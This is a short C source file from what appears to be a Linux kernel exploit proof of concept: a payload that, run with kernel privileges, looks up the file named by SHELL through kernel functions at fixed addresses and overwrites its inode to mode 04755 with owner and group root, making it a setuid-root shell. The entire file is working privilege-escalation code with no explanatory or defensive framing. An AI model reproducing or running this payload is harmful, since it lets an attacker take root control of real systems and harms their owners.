#include "poc.h"

#define AT_FDCWD	-100

struct path {
	void *mnt;
	void *dentry;
};

void _start(void) {
	int (*user_path_at_empty)(int, const char *, unsigned, struct path *, int *) = (void *)X_user_path_at_empty;
	int (*path_put)(void *) = (void *)X_path_put;

	struct path path = { 0 };
	if (!user_path_at_empty(AT_FDCWD, (char []){ SHELL }, 0, &path, (void *)0UL)) {
		void *inode = (void *)(*(unsigned long *)(path.dentry + 48)); // dentry->d_inode
		*(unsigned short *)(inode + 0) = 0104755; // inode->i_mode
		*(unsigned   int *)(inode + 4) = 0; // inode->i_uid
		*(unsigned   int *)(inode + 8) = 0; // inode->i_gid
		path_put(&path);
	}
}
